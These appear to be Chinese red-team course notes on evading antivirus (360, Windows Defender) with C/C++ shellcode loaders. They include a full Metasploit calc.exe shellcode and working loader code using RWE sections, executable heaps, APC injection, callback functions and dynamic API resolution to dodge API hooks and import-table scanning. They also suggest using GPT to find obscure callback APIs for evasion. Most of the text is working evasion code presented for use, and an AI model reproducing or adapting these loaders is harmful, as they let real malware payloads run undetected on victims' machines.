# 课堂随机
1. 在学习测试免杀方法的过程中，不一定采用cs的马能否上线作为测试是否成功的标准，因为cs马上线还涉及通信流量的拦截甚至是一些c2，vps的设置问题，因此可以采用弹计算器的shellcode作为研究测试的代码，如果可以弹出来就说明免杀技术没问题
2. 可以通过msf去生成弹出计算器的代码，看课上的文件，代码都有
3. 课下通过sgn编码shellcode的形式，360开启核晶，测试常见的shellcode执行api会不会被360hook，可以通过一行行注释编译，测试的方法检验？

# shellcode弹计算器
```BIN

\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00
```
1. 该段代码来自msf，没有经过任何处理的shellcode，作用是弹出windows的计算器
2. 这段代码可用于测试loader有没有写正确
3. 测试顺序：先测试马子能否运行（谈计算器）--->换成shellcode测试能否上线--->测试能否免杀

# 函数指针加载shellcode（无用）
1. 只是改变shellcode的加载方式，申请内存，复制到内存这些都不会改变
2. <mark style="background: #FF5582A6;">函数指针基本不起什么作用了，静态直接报毒</mark>
## 示例代码
```c++
#include <Windows.h>

void main(){
 unsigned char sc[] = "\xfc\x48\x83\xe4\xf0\xe8\xc8\x00";
 LPVOID addr = VirtualProtect(sc, sizeof(sc), PAGE_EXECUTE_READWRITE, 0x40);
 if (addr == NULL) {
    return;
 }
 memcpy(addr, sc, sizeof(sc));
 ((void(*)())addr)(); // addr强转成函数指针 , 加() , 调用函数 , 运行这块内存中的shellcode代码
 // ((void(*)())addr)()
 // (void(*)())addr
 // void(*)() 没有参数且返回值类型为void的函数
}
```
1. shellcode字符串部分不解释了
2. 上下部分就是申请内存，将shellcode复制到申请的内存地址中
3. `((void(*)())addr)()`执行内存中代码
4. (void(*)()) 是一个函数指针类型的强制转换, 该函数指针指向一个没有参数且返回值类型为void的函数，也就是说这行代码将 addr 的地址转换为一个函数指针，然后调用该指针所指向的函数
5. `((void(*)())addr)`这些代码作用就是将add强制转换成指针类型，而在外面在包含一个括号之后，再在右侧加一个小括号表示的是执行函数


# 修改内存属性
1. 内存中默认保存数据的内存区域初始化时就是默认可读可写不可执行，所以我们在执行shellcode之前一定要先修改内存区域的属性
2. 该方法说明写loader时可以去掉内存申请的关键API`VirtualAlloc()`，因为有些杀软会hook这个api，那么提供了一种可以替换的方法（<mark style="background: #FF5582A6;">针对绕过所有hook申请内存的API检测点</mark>）
## 示例代码
```c++
void main() {
    DWORD oldProtect = 0;
    // 修改数据内存属性为可执行
    VirtualProtect(sc, sizeof(sc), PAGE_EXECUTE_READWRITE, &oldProtect);
    // 把这个内存的数据转成指针函数, 函数()调用 , 执行shellcode代码
     ((void(*)()) & sc)();
    }
```
1. 其中将shellcode写到全局变量中，就是main函数外面
2. `DWORD oldProtect = 0;`这一句就是指定原先的内存属性，数值一般为0就行
3. `VirtualProtect(sc, sizeof(sc), PAGE_EXECUTE_READWRITE, &oldProtect);`这一句将sc地址的内存属性变成了可读可写可执行，最后一个参数是指老内存的指针地址
4. 最后一句就是指针执行


## 修改data段属性（在优化）
1. 该方法针对如果杀软已经hook了上面的内存属性修改的API后，可以采用该方法规避
2. 课下全面了解PE文件执行的具体全过程？
3. 默认全局变量是存放到data字段中的，所以可将shellcode字符串放到全局变量中，通过将data段改成可读可写可执行就可以了
### 示例代码
```c++
    #include <windows.h>
    #pragma comment(linker, "/section:.data,RWE")//设置 data段可读可写可执行
    
    //全局变量在 data段
    unsigned char sc[] = "\xfc\x48\x83";
    int main() {
     ((void(*)()) & sc)();
    }
```
1. 在头文件中加上了对整个代码的data段变成可读可写可执行

## 新增数据段（<mark style="background: #FF5582A6;">次重点</mark>）
1. 可以新增加一个数据段，让这个数据段可读可写可执行也可以实现shellcode的属性修改
### 示例代码
```c
#include <windows.h>
#pragma data_seg("vdata")

  unsigned char sc[] = "\xfc\x48\x83";
  #pragma data_seg()
  #pragma comment(linker,"/SECTION:vdata,RWE")
  int main() {
    ((void(*)()) & sc)();
  }
```
1. Windows 平台上创建一个特殊的数据段（segment）并在其中存储一些二进制数
2. `#pragma data_seg("vdata")` : 这是一个编译器指令，用于告诉编译器将接下来的数据放置在名为"vdata" 的特殊数据段中。这个数据段是一个自定义命名的段，用于存储一些特殊的数据。
3. `#pragma data_seg() `: 这个指令告诉编译器停止将数据放置在之前定义的特殊数据段中，即"vdata"。
4. `#pragma comment(linker,"/SECTION:vdata,RWE")` : 这是一个链接器指令，告诉链接器将 "vdata"段标记为可读（Read）、可写（Write）、可执行（Execute）。这是为了确保在运行时可以修改这个段的内容，通常用于实现一些动态代码生成或者代码注入的技术
5. `void* shellcode_addr = (void*)sc;`这行代码就是获取shellcode在新数据段中的地址（<mark style="background: #FF5582A6;">重要</mark>）注意sc是shellcode字符串的名字。

# 通过堆加载（<mark style="background: #FF5582A6;">重要</mark>）
除了通过链接器修改数据段的内存属性外, 还可以通过HeapCreate api获取一个具有执行权限的堆, 并在其中分配一块内存，将其地址赋给shellcode, 也是一种规避 VirtualAlloc, VirtualProtect api的一种实现方法, 通过指针运行
## 示例代码
```c
 void main(){
    // 创建一个具有执行权限的堆，以存储shellcode
    HANDLE HeapHandle = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, sizeof(sc), 0);
    // 在创建的堆中分配一块内存，并将其地址赋给buffer
    char* buffer = (char*)HeapAlloc(HeapHandle, HEAP_ZERO_MEMORY, sizeof(sc));
    // 将shellcode复制到buffer指向的内存中
    memcpy(buffer, sc, sizeof(sc));
    // 将buffer指向的内存地址强制转换为一个函数指针，并调用该函数，执行shellcode
    ((void(*)()) buffer)();
   }
```

# APC注入运行（360直接杀，无用）
## 示例代码
```c
#include <windows.h>
#include <stdio.h>

unsigned char sc[] = "\xfc\x48\x83\xe4";
typedef DWORD(WINAPI* pNtTestAlert)();
void main() {
// 修改 shellcode 所在内存区域的保护属性，允许执行
DWORD oldProtect;
VirtualProtect((LPVOID)sc, sizeof(sc), PAGE_EXECUTE_READWRITE, &oldProtect);
/*获取NtTestAlert函数地址, 因为它是一个内部函数.无法直接通过函数名调用
这个函数用于检查当前线程的 APC（Asynchronous Procedure Call，异步过程调用）队列，如果队列中有挂起的用户模式 APC 请求，NtTestAlert 将触发它们的执行*/
pNtTestAlert NtTestAlert = (pNtTestAlert)(GetProcAddress(GetModuleHandleA("ntdll"), "NtTestAlert"));
// 向当前线程的异步过程调用(APC)队列添加一个执行shellcode的任务
QueueUserAPC((PAPCFUNC)(PTHREAD_START_ROUTINE)(LPVOID)sc, GetCurrentThread(), NULL);
//调用NtTestAlert，触发 APC 队列中的任务执行（即执行 shellcode）
NtTestAlert();
}
```
1. 使用 VirtualProtect 函数修改 shellcode 所在内存区域的保护属性，将其设置为可执行、可读、可写（ PAGE_EXECUTE_READWRITE ），以便执行其中的代码。
2. 获取 NtTestAlert 函数的地址。这是一个内部函数，无法直接通过函数名调用。 NtTestAlert 函数用于检查当前线程的 APC 队列。如果队列中有挂起的用户模式 APC 请求， NtTestAlert 将触发它们的执行。
3. 使用 QueueUserAPC 函数向当前线程的 APC 队列添加一个执行 Shellcode 的任务。这将在NtTestAlert 被调用时执行 Shellcode。
4. 调用 NtTestAlert 函数，触发 APC 队列中的任务执行，实现 Shellcode 的执行

# 回调函数运行（<mark style="background: #FF5582A6;">重要</mark>）
1. 简单使用上来讲：就是直接将回到函数中的某个参数换成shellcode内存地址即可
2. 看api函数文档，找到哪个参数是指针，哪个就是需要换成shellcode内存地址的地方
3. 回调函数规避的是杀软对执行shellcode的api进行hook的一种方法
4. <mark style="background: #FF5582A6;">可以通过gpt去寻找陌生的回调函数（找可以执行内存或者线程中代码，但是开发/红队开发不常用的api函数）</mark>
5. <mark style="background: #FF5582A6;">只有找到陌生的回调函数才有用</mark>
### 注意
1. 使用其它回调函数时，要先找到哪个参数是指针
2. 然后将该函数替换到vs的代码中
3. 点击该函数进入函数的具体参数说明中，看一下shellcode占据的那个参数是什么类型
4. 把shellcode地址指针写上并进行类型转换
5. 如果其他参数不清楚直接写`NULL`就可以
#### 举例类型转换
如果回调函数是`EnumWindows()`，两个参数那就写成`EnumWindows((填写该参数类型)&shellcode,NULL)`

1. 改行代码中的`()&shellcode`就是一种对shellcode内存地址的格式转换
2. `&`代表指针类型
3. `shellcode`代表shellcode的字符串名字

### 具体示例
![[image-27.png]]
1. 上述告知了回调函数的各种参数和参数的数据类型（数据类型很重要）
2. 下面给出了一个网址是关于所有的回调函数的参数api表
### 示例代码
![[image-28.png]]

# 创建纤/协程运行（<mark style="background: #FF5582A6;">重要</mark>）
1. 经过尝试发现：示例代码上的回调函数就可以免杀wdf

### 示例代码
![[image-29.png]]

# 动态API调用加载（<mark style="background: #FF5582A6;">重要</mark>）
1. defender对api hook导入表之类的api调用查杀的比较严
2. 动态API函数的调用是在程序执行之后动态解析并获取API函数的地址，所以做了动态调用的API函数是不会出现在导入表中的
3. 本质就是通过`GetProcAddress()`函数动态获取要调用的kernel32.dll中的api函数地址，代码有点像自己写了一个API函数一样
4. <mark style="background: #FF5582A6;">如果采用动态调用API函数，那么就不需要考虑关于内存申请，内存权限修改，回调函数这些重点被检测的API函数，做一次动态调用就相当于自写的一次API函数，一次调用只针对一个关键的API函数</mark>
### 示例代码
![[image-30.png]]
![[image-31.png]]
![[image-32.png]]
![[image-33.png]]
![[image-34.png]]
![[image-35.png]]
<mark style="background: #FF5582A6;">上述示例代码为子实现进程内存地址获取函数的复杂动态api调用代码，可以看课件中的简易版api------重点是学会简易版api动态调用即可</mark>


### 步骤解析
![[image-36.png]]

```c++
#include <windows.h>
#include <stdio.h>

// VirtuallAlloc  自定义类型别名
typedef LPVOID(WINAPI* lpVirtualAlloc)(
	LPVOID lpAddress, // region to reserve orcommit
	SIZE_T dwSize, // size of region
	DWORD flAllocationType, // type of allocation
	DWORD flProtect // type of accessprotection
	);
// CreateThread
typedef HANDLE(WINAPI* hCreateThread)(
	LPSECURITY_ATTRIBUTES lpThreadAttributes, // SD
	SIZE_T dwStackSize, //initial stack size
	LPTHREAD_START_ROUTINE lpStartAddress, // threadfunction
	LPVOID lpParameter, // threadargument
	DWORD dwCreationFlags, // creation option
	LPDWORD lpThreadId // thread identifier
	);

// WaitForSingleObject
typedef DWORD(WINAPI* dwWaitForSingleObject)(
	HANDLE hHandle, // handle to object
	DWORD dwMilliseconds // time-out interval
	);

// RtlMoveMemory
typedef VOID(WINAPI* vRtlMoveMemory)(
	IN VOID UNALIGNED* Destination,
	IN CONST VOID UNALIGNED* Source,
	IN SIZE_T Length
	);
int main() {
	// 获取函数地址并赋值给对应申明的函数
	hCreateThread myCT = (hCreateThread)GetProcAddress(GetModuleHandle(L"Kernel32.dll"), "CreateThread");
	lpVirtualAlloc myVA = (lpVirtualAlloc)GetProcAddress(GetModuleHandle(L"Kernel32.dll"), "VirtualAlloc");
	dwWaitForSingleObject myWFSO = (dwWaitForSingleObject)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "WaitForSingleObject");
	vRtlMoveMemory mymemmove = (vRtlMoveMemory)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "RtlMoveMemory");

	unsigned char buf[] = "\xfc\x48\x83";

	// 申请内存
	LPVOID lpVA = myVA(NULL, sizeof(buf), MEM_COMMIT,PAGE_EXECUTE_READWRITE);
	// 拷贝数据到内存
	mymemmove(lpVA, buf, sizeof(buf));
	// 创建线程
	HANDLE hThread = myCT(
		NULL,
		NULL,
		(LPTHREAD_START_ROUTINE)lpVA,
		NULL,
		NULL,
		0
	);
	// 等待线程运行
	myWFSO(hThread, -1);
	// 关闭线程
	CloseHandle(hThread);
	return 0;
}
```

<mark style="background: #FF5582A6;">重点注意</mark>
1. 使用动态加载函数时，一定要按照该种方法来，原因：一是测试过有效，二是代码简捷
2. 动态加载该API函数之后，执行该函数时一定也是按照原生的api函数执行方式去使用（所以参考的函数使用方法就是原生函数的使用）
3. 上述示例代码中的`dwWaitForSingleObject`是在原生API函数上自己加了两个小字母`dw`本质就是自己开发时写的小名称，自己起的


## 动态实现GetProcAddress（）函数
1. 上面只能将其余的api函数隐藏没办法将动态获取函数内存地址的函数隐藏
2. 操作时直接按照笔记做就好
3. 利用VS/C++去过defender一定要做的就是核心API函数的动态加载甚至是自实现API
4. go语言本身对于一些关键的API就是动态加载的
